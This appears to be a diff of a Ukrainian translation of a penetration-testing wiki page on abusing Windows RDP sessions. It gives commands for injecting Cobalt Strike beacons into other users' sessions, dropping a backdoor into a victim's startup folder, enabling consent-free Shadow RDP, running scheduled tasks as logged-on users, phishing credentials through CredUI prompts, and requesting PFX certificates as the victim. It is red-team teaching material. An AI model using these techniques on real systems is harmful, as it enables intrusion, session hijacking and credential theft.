@@ -1,12 +1,12 @@
-# Зловживання RDP сесіями
+# Зловживання RDP-сесіями
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## RDP Process Injection
+## Ін'єкція процесів через RDP
 
-Якщо **зовнішня група** має **RDP access** до будь-якого **комп'ютера** в поточному домені, **attacker** може **компрометувати цей комп'ютер і чекати на користувача**.
+Якщо **зовнішня група** має **RDP-доступ** до будь-якого **комп'ютера** в поточному домені, **attacker** може **скомпрометувати цей комп'ютер і чекати на нього**.
 
-Коли цей користувач підключиться через RDP, **attacker може pivot у сесію цього користувача** і зловживати його дозволами у зовнішньому домені.
+Після того як цей користувач увійде через RDP, **attacker може переміститися до сесії цього користувача** та зловживати його дозволами у зовнішньому домені.
 ```bash
 # Supposing the group "External Users" has RDP access in the current domain
 ## lets find where they could access
@@ -30,13 +30,13 @@ PID   PPID  Name                         Arch  Session     User
 beacon> inject 4960 x64 tcp-local
 ## From that beacon you can just run powerview modules interacting with the external domain as that user
 ```
-Перегляньте **other ways to steal sessions with other tools** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
+Перевірте **інші способи крадіжки сесій за допомогою інших інструментів** [**на цій сторінці.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)
 
 ## RDPInception
 
-Якщо користувач підключається через **RDP into a machine**, де **attacker** його **waiting**, цей attacker зможе **inject a beacon in the RDP session of the user**, а якщо **victim mounted his drive** під час доступу через RDP, то **attacker could access it**.
+Якщо користувач отримує доступ через **RDP до машини**, де на нього **очікує** **attacker**, attacker зможе **інжектити beacon у RDP-сесію користувача**, а якщо **victim підключив свій диск** під час доступу через RDP, **attacker зможе отримати до нього доступ**.
 
-У цьому випадку ви можете просто **compromise** **victims** **original computer**, записавши **backdoor** у **statup folder**.
+У цьому випадку можна просто **скомпрометувати** **оригінальний комп'ютер** **victim**, записавши **backdoor** у **папку автозапуску**.
 ```bash
 # Wait til someone logs in:
 net logons
@@ -70,12 +70,14 @@ beacon> upload C:\Payloads\pivot.exe
 ```
 ## Shadow RDP
 
-Якщо ви є **local admin** на хості, де жертва вже має **active RDP session**, ви можете мати можливість **переглядати/керувати цим робочим столом без викрадення пароля або дампу LSASS**.
+Якщо ви є **local admin** на хості, де жертва вже має **active RDP session**, ви можете **переглядати/контролювати цей робочий стіл без викрадення пароля або дампу LSASS**.<sup>[[1]](#references)</sup>
 
-Це залежить від політики **Remote Desktop Services shadowing**, що зберігається в:
+Це залежить від політики **Remote Desktop Services shadowing**, що зберігається в:<sup>[[2]](#references)[[3]](#references)</sup>
 ```text
 HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
 ```
+Цікаві значення:
+
 - `0`: Вимкнено
 - `1`: `EnableInputNotify` (керування, потрібне підтвердження користувача)
 - `2`: `EnableInputNoNotify` (керування, **без підтвердження користувача**)
@@ -92,64 +94,64 @@ reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shado
 quser /server:<HOST>
 mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
 ```
-Це особливо корисно, коли привілейований користувач, підключений через RDP, залишив розблокований робочий стіл, сеанс KeePass, консоль MMC, сесію браузера або відкритий admin shell.
+Це особливо корисно, коли привілейований користувач, підключений через RDP, залишив незаблокований робочий стіл, сеанс KeePass, консоль MMC, сеанс браузера або відкриту admin shell.
 
-## Scheduled Tasks від імені увійденого користувача
+## Scheduled Tasks As Logged-On User
 
-Якщо ви є **local admin** і цільовий користувач **currently logged on**, Task Scheduler може запустити код **as that user without their password**.
+Якщо ви є **local admin**, а цільовий користувач **зараз увійшов у систему**, Task Scheduler може запустити code **від імені цього користувача без його пароля**.<sup>[[1]](#references)[[4]](#references)</sup>
 
-Це перетворює існуючу сесію входу жертви на execution primitive:
+Це перетворює наявний сеанс входу жертви на примітив виконання:
 ```cmd
 schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
 schtasks /run /S <HOST> /TN "Updater"
 ```
-Notes:
+Нотатки:
 
 - Якщо користувач **не ввійшов у систему**, Windows зазвичай вимагає пароль для створення завдання, яке виконуватиметься від його імені.
-- Якщо користувач **увійшов у систему**, завдання може повторно використовувати існуючий контекст входу.
-- Це практичний спосіб виконати GUI-дії або запустити бінарні файли всередині сеансу жертви без звернення до LSASS.
+- Якщо користувач **вже ввійшов у систему**, завдання може повторно використати наявний контекст входу.
+- Це практичний спосіб виконувати дії GUI або запускати бінарні файли всередині сесії жертви без взаємодії з LSASS.
 
-## CredUI Prompt Abuse From the Victim Session
+## Зловживання CredUI Prompt із сесії жертви
 
-Якщо ви можете виконувати команди **всередині інтерактивного робочого столу жертви** (наприклад через **Shadow RDP** або **заплановане завдання, що виконується від імені цього користувача**), ви можете відобразити **реальне вікно запиту облікових даних Windows** за допомогою CredUI API та зібрати облікові дані, введені жертвою.
+Якщо ви можете виконувати код **усередині інтерактивного робочого столу жертви** (наприклад, через **Shadow RDP** або **заплановане завдання, що виконується від імені цього користувача**), ви можете відобразити **справжній запит облікових даних Windows** за допомогою API CredUI та отримати облікові дані, введені жертвою.<sup>[[1]](#references)</sup>
 
 Відповідні API:
 
 - `CredUIPromptForWindowsCredentials`
 - `CredUnPackAuthenticationBuffer`
 
-Типовий сценарій:
+Типовий процес:
 
-1. Spawn a binary in the victim session.
-2. Display a domain-authentication prompt that matches the current domain branding.
-3. Unpack the returned auth buffer.
-4. Validate the provided credentials and optionally keep prompting until valid credentials are entered.
+1. Запустити бінарний файл у сесії жертви.
+2. Відобразити запит автентифікації домену, що відповідає брендингу поточного домену.
+3. Розпакувати отриманий буфер автентифікації.
+4. Перевірити надані облікові дані та, за потреби, продовжувати показ запиту, доки не буде введено дійсні облікові дані.
 
-Це корисно для **on-host phishing**, оскільки підказка відображається стандартними Windows API замість фальшивої HTML-форми.
+Це корисно для **фішингу на хості**, оскільки запит відображається стандартними API Windows, а не підробленою HTML-формою.
 
-## Requesting a PFX In the Victim Context
+## Запит PFX у контексті жертви
 
-Та сама примітива **scheduled-task-as-user** може використовуватися для запиту **сертифіката/PFX від імені увійшовшого користувача**. Цей сертифікат може пізніше використовуватися для **AD authentication** від імені цього користувача, повністю уникаючи викрадення пароля.
+Той самий примітив **запланованого завдання від імені користувача** можна використати для запиту **сертифіката/PFX від імені жертви, яка ввійшла в систему**. Пізніше цей сертифікат можна використати для **автентифікації в AD** як цей користувач, повністю уникаючи викрадення пароля.<sup>[[1]](#references)[[5]](#references)</sup>
 
-Загальна послідовність:
+Процес на високому рівні:
 
-1. Gain **local admin** on a host where the victim is logged on.
-2. Run enrollment/export logic as the victim using a **заплановане завдання**.
-3. Export the resulting **PFX**.
-4. Use the PFX for PKINIT / certificate-based AD authentication.
+1. Отримати права **локального адміністратора** на хості, де жертва ввійшла в систему.
+2. Виконати логіку отримання/експорту від імені жертви за допомогою **запланованого завдання**.
+3. Експортувати отриманий **PFX**.
+4. Використати PFX для PKINIT / автентифікації в AD на основі сертифіката.
 
-See the AD CS pages for follow-up abuse:
+Див. сторінки AD CS для подальшого зловживання:
 
 {{#ref}}
 ad-certificates/account-persistence.md
 {{#endref}}
 
-## References
+## Посилання
 
-- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
-- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
-- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
-- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
-- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
+- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
+- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
+- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
+- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
+- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)
 
 {{#include ../../banners/hacktricks-training.md}}
